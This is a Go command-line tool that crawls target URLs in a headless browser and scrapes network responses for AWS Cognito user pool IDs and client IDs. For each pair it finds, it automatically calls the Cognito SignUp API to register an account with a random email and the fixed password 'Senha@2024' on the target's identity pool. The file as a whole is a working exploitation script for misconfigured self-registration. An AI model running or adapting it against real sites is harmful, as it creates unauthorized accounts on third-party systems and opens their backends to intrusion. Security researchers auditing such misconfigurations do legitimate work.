package main

import (
	"bufio"
	_ "context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/alexflint/go-arg"
	"github.com/fatih/color"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/cognitoidentityprovider"
	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
)

var colors = map[string]string{
	"reset": "\x1b[0m",
	"green": "\x1b[32m",
	"blue":  "\x1b[34m",
}

func validateCredentials(clientId, poolId string) {
	region := strings.Split(poolId, "_")[0]

	sess := session.Must(session.NewSession(&aws.Config{
		Region: aws.String(region),
	}))

	cognito := cognitoidentityprovider.New(sess)

	randomBytes := make([]byte, 4)
	_, err := rand.Read(randomBytes)
	if err != nil {
		log.Fatalf("Failed to generate random bytes: %v", err)
	}
	randomString := hex.EncodeToString(randomBytes)
	email := fmt.Sprintf("a%s@besuspicious.xyz", randomString)
	pass := "Senha@2024"

	params := &cognitoidentityprovider.SignUpInput{
		ClientId: aws.String(clientId),
		Username: aws.String(email),
		Password: aws.String(pass),
		UserAttributes: []*cognitoidentityprovider.AttributeType{
			{
				Name:  aws.String("email"),
				Value: aws.String(email),
			},
			{
				Name:  aws.String("phone_number"),
				Value: aws.String("+12345678901"),
			},
			{
				Name:  aws.String("birthdate"),
				Value: aws.String("1970-01-01"),
			},
			{
				Name:  aws.String("given_name"),
				Value: aws.String("a"),
			},
			{
				Name:  aws.String("family_name"),
				Value: aws.String("a"),
			},
		},
	}

	_, err = cognito.SignUp(params)
	if err != nil {
		fmt.Printf("Error signing up for %s: %v\n", color.HiRedString(clientId), err)
	} else {
		fmt.Printf("Created user %s:%s => %s for %s\n",
			color.HiCyanString(email), color.HiCyanString(pass),
			color.BlueString(poolId), color.GreenString(clientId))
	}
}

// Go's stdlib devs are lazy
func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func findCredentials(body string, scope string, wg *sync.WaitGroup) {
	defer wg.Done()
	text := body
	regs := [][2]string{
		{"keyword", `(?i)cognito`},
		{"pool_id", `[a-zA-Z]+-[a-zA-Z]+-\d+_[a-zA-Z0-9]+`},
	}
	clientIDRegex := regexp.MustCompile(`[a-z0-9]{26}`)
	distThreshold := 256

	var locs []struct {
		name, match string
		index       int
	}

	for _, reg := range regs {
		re := regexp.MustCompile(reg[1])
		matches := re.FindAllStringIndex(text, -1)
		for _, match := range matches {
			locs = append(locs, struct {
				name, match string
				index       int
			}{reg[0], text[match[0]:match[1]], match[0]})
		}
	}

	if len(locs) > 0 {
		matches := clientIDRegex.FindAllStringIndex(text, -1)
		for _, match := range matches {
			for _, loc := range locs {
				if loc.name == "pool_id" && abs(loc.index-match[0]) < distThreshold {
					fmt.Printf("[MATCH!] %s (%s, %s) at index %d\n",
						color.YellowString(scope), text[match[0]:match[1]],
						color.BlueString(loc.match), match[0])
					validateCredentials(text[match[0]:match[1]], loc.match)
				}
			}
		}
	}
}

func scanUrl(browser *rod.Browser, wg *sync.WaitGroup, url string) {
	page := browser.MustPage()
	defer page.Close()
	go page.EachEvent(func(e *proto.NetworkLoadingFinished) {
		reply, err := (proto.NetworkGetResponseBody{RequestID: e.RequestID}).Call(page)
		if err != nil {
			fmt.Errorf("%v\n", err)
		}
		wg.Add(1)
		go findCredentials(reply.Body, url, wg)
	})()

	page.MustNavigate(url).MustWaitStable()
}

func urlsFromFile(fname string) []string {
	var lines []string
	file, err := os.Open(fname)
	if err != nil {
		return lines
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		fmt.Println(line)
		lines = append(lines, line)
	}

	return lines
}

func main() {

	var CLI struct {
		File string `arg:"-l"`
		Url  string `arg:"-u"`
	}

	arg.MustParse(&CLI)

	l := launcher.New().Headless(true)
	defer l.Cleanup()

	browser := rod.New().ControlURL(l.MustLaunch()).MustConnect()
	defer browser.MustClose()

	var wg sync.WaitGroup
	defer wg.Wait()

	if len(CLI.Url) > 0 {
		scanUrl(browser, &wg, CLI.Url)
	} else if len(CLI.File) > 0 {
		for _, url := range urlsFromFile(CLI.File) {
			scanUrl(browser, &wg, url)
		}
	}

}
